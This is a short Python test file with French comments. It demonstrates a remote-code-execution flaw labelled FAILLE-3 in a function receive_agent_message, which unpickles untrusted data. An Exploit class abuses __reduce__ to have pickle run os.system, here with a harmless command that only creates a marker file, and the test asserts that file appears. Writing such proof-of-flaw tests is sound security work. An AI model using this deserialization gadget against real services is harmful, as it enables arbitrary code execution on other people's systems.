import os
import pickle
import pytest
from queenbee import receive_agent_message

# Fichier témoin qui servira de preuve pour l'exécution de code arbitraire
TRIGGER_FILE = "pwned.txt"

class Exploit:
    def __reduce__(self):
        """
        Méthode magique appelée par pickle lors de la désérialisation.
        Elle indique à Python d'exécuter une fonction avec des arguments donnés.
        """
        # Commande OS simulant une action malveillante (création d'un fichier)
        return (os.system, (f"touch {TRIGGER_FILE}",))

def test_faille_3_pickle_rce():
    """
    Prouve la FAILLE-3 : Exécution de code à distance (RCE) via pickle.loads().
    """
    # Nettoyage initial si le fichier existe déjà
    if os.path.exists(TRIGGER_FILE):
        os.remove(TRIGGER_FILE)

    # 1. Génération de la charge utile malveillante sérialisée
    malicious_payload = pickle.dumps(Exploit())

    # 2. Exécution du code vulnérable avec la charge utile
    # Au moment du pickle.loads(), la commande système s'exécute
    receive_agent_message(malicious_payload)

    # 3. Preuve de la faille : Le fichier témoin a été créé par le système
    assert os.path.exists(TRIGGER_FILE), "La faille RCE n'a pas fonctionné, le code n'a pas été exécuté."

    # Nettoyage après le test
    os.remove(TRIGGER_FILE)
